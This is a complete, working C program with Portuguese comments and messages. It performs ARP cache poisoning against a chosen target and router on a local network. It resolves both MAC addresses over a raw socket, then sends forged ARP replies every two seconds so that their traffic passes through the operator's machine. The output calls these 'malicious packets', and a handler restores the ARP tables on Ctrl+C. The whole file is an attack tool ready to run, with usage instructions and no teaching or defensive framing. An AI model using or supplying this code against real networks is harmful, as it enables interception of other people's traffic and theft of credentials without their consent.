#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <netinet/ether.h>
#include <arpa/inet.h>
#include <linux/if_packet.h>
#include <signal.h>
#include <errno.h>

#define ETH_ALEN 6
#define ARP_REQUEST 1
#define ARP_REPLY 2

struct arp_header {
    unsigned short ar_hrd;
    unsigned short ar_pro;
    unsigned char  ar_hln;
    unsigned char  ar_pln;
    unsigned short ar_op;
    unsigned char  ar_sha[ETH_ALEN];
    unsigned char  ar_sip[4];
    unsigned char  ar_tha[ETH_ALEN];
    unsigned char  ar_tip[4];
};

struct arp_packet {
    struct ethhdr eth;
    struct arp_header arp;
};

int sock_raw;
unsigned char my_mac[ETH_ALEN];
unsigned char target_mac[ETH_ALEN];
unsigned char router_mac[ETH_ALEN];
char *target_ip_str;
char *router_ip_str;
char *iface;
int ifindex;

// Declaração antecipada das funções de restauração
void restore_network();

void handle_sigint(int sig) {
    printf("\n[!] Interrupção detetada (Ctrl+C). A restaurar a rede original...\n");
    restore_network();
    if (sock_raw >= 0) close(sock_raw);
    printf("[+] Redes e tabelas ARP limpas. A sair.\n");
    exit(0);
}

// Obter MAC e IP da nossa própria interface
int get_local_info(const char *iface_name, unsigned char *mac, char *ip_out, int *idx) {
    struct ifreq ifr;
    int fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd < 0) return -1;

    strncpy(ifr.ifr_name, iface_name, IFNAMSIZ-1);

    // MAC
    if (ioctl(fd, SIOCGIFHWADDR, &ifr) < 0) { close(fd); return -1; }
    memcpy(mac, ifr.ifr_hwaddr.sa_data, ETH_ALEN);

    // Index
    if (ioctl(fd, SIOCGIFINDEX, &ifr) < 0) { close(fd); return -1; }
    *idx = ifr.ifr_ifindex;

    // IP
    if (ioctl(fd, SIOCGIFADDR, &ifr) < 0) { close(fd); return -1; }
    struct sockaddr_in *ip_addr = (struct sockaddr_in *)&ifr.ifr_addr;
    strcpy(ip_out, inet_ntoa(ip_addr->sin_addr));

    close(fd);
    return 0;
}

// Função avançada para descobrir o MAC de um IP alvo através de ARP Request (Who-has)
int resolve_mac(int sock, int ifindex, const char *iface_name, unsigned char *src_mac, const char *src_ip, const char *dest_ip, unsigned char *dest_mac_out) {
    struct arp_packet packet;
    struct sockaddr_ll socket_address;
    
    // Broadcast MAC para o pedido ARP inicial
    unsigned char broadcast_mac[ETH_ALEN] = {0xff, 0xff, 0xff, 0xff, 0xff, 0xff};
    unsigned char zero_mac[ETH_ALEN] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};

    memset(&packet, 0, sizeof(packet));

    // Ethernet Header
    memcpy(packet.eth.h_dest, broadcast_mac, ETH_ALEN);
    memcpy(packet.eth.h_source, src_mac, ETH_ALEN);
    packet.eth.h_proto = htons(ETH_P_ARP);

    // ARP Header (Request)
    packet.arp.ar_hrd = htons(ARPHRD_ETHER);
    packet.arp.ar_pro = htons(ETH_P_IP);
    packet.arp.ar_hln = ETH_ALEN;
    packet.arp.ar_pln = 4;
    packet.arp.ar_op = htons(ARP_REQUEST);

    memcpy(packet.arp.ar_sha, src_mac, ETH_ALEN);
    inet_pton(AF_INET, src_ip, packet.arp.ar_sip);
    memcpy(packet.arp.ar_tha, zero_mac, ETH_ALEN);
    inet_pton(AF_INET, dest_ip, packet.arp.ar_tip);

    memset(&socket_address, 0, sizeof(socket_address));
    socket_address.sll_family = AF_PACKET;
    socket_address.sll_protocol = htons(ETH_P_ARP);
    socket_address.sll_ifindex = ifindex;
    socket_address.sll_halen = ETH_ALEN;
    memcpy(socket_address.sll_addr, broadcast_mac, ETH_ALEN);

    // Enviar pedido e escutar resposta com timeout
    struct timeval tv;
    tv.tv_sec = 1;
    tv.tv_usec = 0;
    setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, (const char*)&tv, sizeof(tv));

    int attempts = 3;
    while (attempts--) {
        if (sendto(sock, &packet, sizeof(packet), 0, (struct sockaddr*)&socket_address, sizeof(socket_address)) < 0) {
            continue;
        }

        // Ler pacotes da rede à procura da resposta ARP (ARP Reply)
        unsigned char buffer[65536];
        while (1) {
            int data_len = recvfrom(sock, buffer, sizeof(buffer), 0, NULL, NULL);
            if (data_len < 0) break; // Timeout

            struct arp_packet *recv_packet = (struct arp_packet *)buffer;
            if (ntohs(recv_packet->eth.h_proto) == ETH_P_ARP && ntohs(recv_packet->arp.ar_op) == ARP_REPLY) {
                // Verificar se o IP remetente da resposta corresponde ao IP que procuramos
                struct in_addr resp_ip;
                memcpy(&resp_ip, recv_packet->arp.ar_sip, 4);
                if (strcmp(inet_ntoa(resp_ip), dest_ip) == 0) {
                    memcpy(dest_mac_out, recv_packet->arp.ar_sha, ETH_ALEN);
                    return 0; // Sucesso!
                }
            }
        }
    }
    return -1; // Falhou a resolução
}

// Enviar pacote de Spoofing individual
void send_spoof(int sock, int ifindex, unsigned char *src_mac, const char *spoof_ip, const char *target_ip, const unsigned char *target_mac) {
    struct arp_packet packet;
    struct sockaddr_ll socket_address;

    memset(&packet, 0, sizeof(packet));

    memcpy(packet.eth.h_dest, target_mac, ETH_ALEN);
    memcpy(packet.eth.h_source, src_mac, ETH_ALEN);
    packet.eth.h_proto = htons(ETH_P_ARP);

    packet.arp.ar_hrd = htons(ARPHRD_ETHER);
    packet.arp.ar_pro = htons(ETH_P_IP);
    packet.arp.ar_hln = ETH_ALEN;
    packet.arp.ar_pln = 4;
    packet.arp.ar_op = htons(ARP_REPLY);

    memcpy(packet.arp.ar_sha, src_mac, ETH_ALEN);
    inet_pton(AF_INET, spoof_ip, packet.arp.ar_sip);
    memcpy(packet.arp.ar_tha, target_mac, ETH_ALEN);
    inet_pton(AF_INET, target_ip, packet.arp.ar_tip);

    memset(&socket_address, 0, sizeof(socket_address));
    socket_address.sll_family = AF_PACKET;
    socket_address.sll_protocol = htons(ETH_P_ARP);
    socket_address.sll_ifindex = ifindex;
    socket_address.sll_halen = ETH_ALEN;
    memcpy(socket_address.sll_addr, target_mac, ETH_ALEN);

    sendto(sock, &packet, sizeof(packet), 0, (struct sockaddr*)&socket_address, sizeof(socket_address));
}

void restore_network() {
    // Para restaurar, dizemos ao alvo o MAC real do router, e ao router o MAC real da vítima
    for (int i = 0; i < 5; i++) {
        send_spoof(sock_raw, ifindex, router_mac, router_ip_str, target_ip_str, target_mac);
        send_spoof(sock_raw, ifindex, target_mac, target_ip_str, router_ip_str, router_mac);
        usleep(500000);
    }
}

int main(int argc, char *argv[]) {
    if (argc < 4) {
        printf("Uso: sudo ./arpspoof_pro <INTERFACE> <IP_DO_ALVO> <IP_DO_ROUTER>\n");
        return 1;
    }

    iface = argv[1];
    target_ip_str = argv[2];
    router_ip_str = argv[3];

    signal(SIGINT, handle_sigint);

    char my_ip[INET_ADDRSTRLEN];
    if (get_local_info(iface, my_mac, my_ip, &ifindex) < 0) {
        perror("[-] Erro ao obter dados da interface de rede");
        return 1;
    }

    sock_raw = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
    if (sock_raw < 0) {
        perror("[-] Erro ao criar raw socket (executa com sudo)");
        return 1;
    }

    printf("[*] Interface: %s | O meu IP: %s\n", iface, my_ip);
    printf("[*] A resolver endereços MAC via ARP...\n");

    // Resolver MAC do Alvo
    if (resolve_mac(sock_raw, ifindex, iface, my_mac, my_ip, target_ip_str, target_mac) < 0) {
        fprintf(stderr, "[-] Erro: Não foi possível obter o MAC do Alvo (%s)\n", target_ip_str);
        close(sock_raw);
        return 1;
    }
    printf("[+] MAC do Alvo (%s) descoberto: %02x:%02x:%02x:%02x:%02x:%02x\n", 
           target_ip_str, target_mac[0], target_mac[1], target_mac[2], target_mac[3], target_mac[4], target_mac[5]);

    // Resolver MAC do Router
    if (resolve_mac(sock_raw, ifindex, iface, my_mac, my_ip, router_ip_str, router_mac) < 0) {
        fprintf(stderr, "[-] Erro: Não foi possível obter o MAC do Router (%s)\n", router_ip_str);
        close(sock_raw);
        return 1;
    }
    printf("[+] MAC do Router (%s) descoberto: %02x:%02x:%02x:%02x:%02x:%02x\n", 
           router_ip_str, router_mac[0], router_mac[1], router_mac[2], router_mac[3], router_mac[4], router_mac[5]);

    printf("\n[*] A iniciar ARP Poisoning ativo...\n");
    printf("[*] Pressiona CTRL+C para parar com segurança.\n");

    unsigned long packets_sent = 0;
    while (1) {
        // Envenenar Alvo (fingir ser o Router)
        send_spoof(sock_raw, ifindex, my_mac, router_ip_str, target_ip_str, target_mac);
        // Envenenar Router (fingir ser o Alvo)
        send_spoof(sock_raw, ifindex, my_mac, target_ip_str, router_ip_str, router_mac);

        packets_sent += 2;
        printf("\r[+] Pacotes maliciosos enviados: %lu", packets_sent);
        fflush(stdout);

        usleep(2000000); // A cada 2 segundos
    }

    close(sock_raw);
    return 0;
}